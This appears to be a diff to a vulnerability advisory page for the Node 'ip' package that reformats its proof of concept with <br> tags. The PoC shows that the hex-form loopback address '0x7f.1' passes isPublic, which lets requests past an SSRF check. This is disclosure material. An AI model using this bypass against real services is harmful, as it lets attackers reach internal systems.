@@ -34,21 +34,21 @@ Because of this vulnerability, attackers can bypass some SSRF mitigations.
 
 <h1>PoC</h1>
  <code>
-        var ip = require('ip');
-        console.log(ip.isPublic("0x7f.1")); // true
+        <br>var ip = require('ip');</br>
+        <br>console.log(ip.isPublic("0x7f.1")); // true</br>
 
-        // Check IP and IF IP is not public do HTTP req ==> SSRF
-        var my_ip = "0x7f.1"; // private but ip package doesn't recognize as private!
-        // var my_ip2 = "google.com"; // public --> fetch will be completed
-        // var my_ip3 = "127.0.0.1"; // private --> else statement will be run
+        <br>// Check IP and IF IP is not public do HTTP req ==> SSRF</br>
+        <br>var my_ip = "0x7f.1"; // private but ip package doesn't recognize as private!</br>
+        <br>// var my_ip2 = "google.com"; // public --> fetch will be completed</br>
+        <br>// var my_ip3 = "127.0.0.1"; // private --> else statement will be run</br>
 
-        if (ip.isPublic(my_ip)) {
-            fetch("http://" + my_ip).then((response) => {
-                console.log(response);
-            });
-        } else {
-            console.log("IP is not public");
-        }
+        <br>if (ip.isPublic(my_ip)) {</br>
+            <br>fetch("http://" + my_ip).then((response) => {</br>
+                <br>console.log(response);</br>
+            <br>});</br>
+        <br>} else {</br>
+            <br>console.log("IP is not public");</br>
+        <br>}</br>
  </code>
 </body>
 </html>
